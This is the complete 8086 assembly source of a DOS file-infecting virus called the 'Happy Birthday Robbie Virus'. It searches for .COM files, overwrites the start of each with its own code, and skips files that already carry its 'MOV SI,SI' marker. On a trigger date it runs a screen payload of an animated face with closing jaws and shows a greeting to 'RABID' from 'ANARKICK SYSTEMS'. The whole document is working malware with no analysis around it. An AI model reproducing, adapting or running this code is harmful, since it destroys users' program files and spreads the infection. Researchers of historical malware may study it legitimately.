;
;Happy Birthday Robbie Virus
;

        code    segment 'CODE'
                assume cs:code,ds:code,es:code,ss:code

                org     0100h

code_length     equ     finish - start
lf		equ	0Ah
cr		equ	0Dh

start           label   near
               
id_bytes        proc    near
                mov     si,si                   ; Serves no purpose:  our ID
id_bytes        endp

main:           mov     ah,04Eh                 ; DOS find first file function
                mov     cx,00100111b            ; CX holds attribute mask
                mov     dx,offset com_spec      ; DX points to "*.COM"

file_loop:      int     021h
                jc      exit_virus            ; If there are no files, go
                                                ; off

                call    infect_file             ; Try to infect found file
                jne     exit_virus              ; Exit if successful

                mov     ah,04Fh                 ; DOS find next file function
                jmp     short file_loop         ; Repeat until out of files

exit_virus:    
		mov    ah,2Ah
		int    21h
		cmp    dl,3
 		jne	dos_drop
		cmp    dh,10
		je     eat_screen
dos_drop:	int	20h
eat_screen:	mov	byte ptr count,0
		mov	ah,00
		mov	al,03
		int	10h 
		mov	ah,08
		int	10h
		mov	byte ptr count2,al
		cmp	byte ptr count2,00
		jne	draw_face
		mov	byte ptr count2,0fh
draw_face:
		mov	ah,01		;set cursor type
		mov	cl,00
		mov	ch,40h
		int	10h
		mov	cl,00
		mov	dl,4fh
		mov	ah,06		;clear the display window
		mov	al,00
		mov	bh,0fh		;blank line attribs
		mov	ch,00		;starting at upper left corner
		mov	cl,00		; to
		mov	dh,00		;row 0
		mov	dl,4fh		;column 4Fh
		int	10h
		mov	ah,02		;set cursor position
		mov	dh,00		;to row 0, 
		mov	dl,1fh		;column 1Fh
		mov	bh,00		;in graphics mode
		int	10h
		mov	dx,offset eyes  ;get the eyes
		mov	ah,09		;and draw them to screen
		mov	bl,0fh		;this colour
		int	21h
		mov	ah,02		;reposition character
		mov	dh,01		;to row 1,
		mov	dl,00		;column 0
		int	10h
		mov	ah,09		;write character and attrib
		mov	al,0dch		;character shape
		mov	bl,0fh		;character colour
		mov	cx,50h		;number of characters.
		int	10h
		mov	ah,02		;reposition cursor
		mov	dh,18h		;to row 18h
		mov	dl,00		;column 0
		int	10h
		mov	ah,09		;write character & attribute
		mov	al,0dfh		;character shape
		mov	bl,0fh		;character colour
		mov	cx,0050h	;number of characters
		int	10h
		mov	dl,00		;back to column 0
make_teeth:
		mov	ah,02		;set cursor position
		mov	dh,02		;to row 2
		int	10h
		mov	ah,09		;write the character
		mov	al,55h		; "U" for one top tooth
		mov	bl,0fh		; colour code
		mov	cx,1		;only one tooth
		int	10h
		mov	ah,02
		mov	dh,17h		;row 17h
		inc	dl		;increase column number
		int	10h
		mov	ah,09		;write a character there.
		mov	al,0efh		;character "ï" for bottom teeth 
		mov	bl,0fh		;colour code
		int	10h
		inc	dl		;increment column number
		cmp	dl,50h		;is there 50h of them yet?
		jl	make_teeth	;make more if not
		mov	byte ptr count,0 ;0 the counter
pause_1:
		mov	cx,7fffh
a_loop:	
		loop	a_loop		;pause
		inc	byte ptr count
		cmp	byte ptr count,0ah
		jl	pause_1
		mov	byte ptr count,00
		mov	cl,00		;from column 0
		mov	dl,4fh		;to column 79,
close_jaws:
		mov	ah,06		;scroll the page up
		mov	al,01		;blanking a line
		mov	bh,byte ptr count ;with this attribute
		mov	ch,0dh		;and from row 13
		mov	dh,18h		;to row 24
		int	10h
		mov	ah,07		;scroll downward
		mov	al,01		;blanking one line
		mov	bh,byte ptr count ;with this attribute
		mov	ch,00		;from row 0
		mov	dh,0ch		;to row 12
		int	10h
		mov	cx,3fffh
b_loop:	
		loop	b_loop		;pause
		inc	byte ptr count
		cmp	byte ptr count,0bh
		jl	close_jaws
		mov	byte ptr count,00
pause_2:	
		mov	cx,7fffh
finish_up:
		loop	finish_up
		inc	byte ptr count		;increment count by 1
		cmp	byte ptr count,0ah	;is it a 10 yet?
		jl	pause_2			;no? loop again...
		mov	ah,06			;scroll page up
		mov	al,00			;blank entire window
		mov	bh,byte ptr count	;with this attribute
		mov	ch,00			;from row 0,
		mov	cl,00			;column 0,
		mov	dh,18h			;to row 18h
		mov	dl,4fh			;column 79
		int	10h
		mov	ah,01			;reset cursor type
		mov	cl,07
		mov	ch,06			;everything is back to normal
		int	10h
		mov	si,offset rabid
fuckin_loop:	lodsb
		or 	al,al
		jz	$
		mov	ah, 0Eh
		int	10h
		jmp	short fuckin_loop
infect_file:
                mov     ax,03D02h               ; DOS open file function,
                                                ; read-write
                mov     dx,09Eh                 ; DX points to the victim
                int     021h

                xchg    bx,ax                   ; BX holds file handle

                mov     ah,03Fh                 ; DOS read from file function
                mov     cx,2                    ; CX holds byte to read (2)
                mov     dx,offset buffer        ; DX points to buffer
                int     021h

                cmp     word ptr [buffer],0F68Bh;Are the two bytes "MOV SI,SI"
                pushf                           ; Save flags
                je      close_it_up             ; If not, then file is OK

                cwd                             ; Zero CX \_ Zero bytes from
                                                ; start
                mov     cx,dx                   ; Zero DX /
                mov     ax,04200h               ; DOS file seek function,
                                                ; start
                int     021h

                mov     ah,040h                 ; DOS write to file function
                mov     cx,code_length          ; CX holds virus length
                mov     dx,offset start         ; DX points to start of virus
                int     021h

close_it_up:    mov     ah,03Eh                 ; DOS close file function
                int     021h

                popf                            ; Restore flags
                ret                             ; Return to caller

buffer          dw      ?                       ; Buffer to hold test data

; Initialized data goes here

com_spec        db      "*.COM",0               ; What to infect:  all COM
count   db      0, 0
count2  db      0, 0
eyes    db      '(o)          (o)$'
dinked	db	'[Malmsey Habitat v. 1.3]',      0
rabid   db	 cr, lf
	db	'Warmest Regards to  RABID', cr, lf
	db	'from -- ANARKICK SYSTEMS!  ',0,'$'

finish:   

code            ends
                end     start

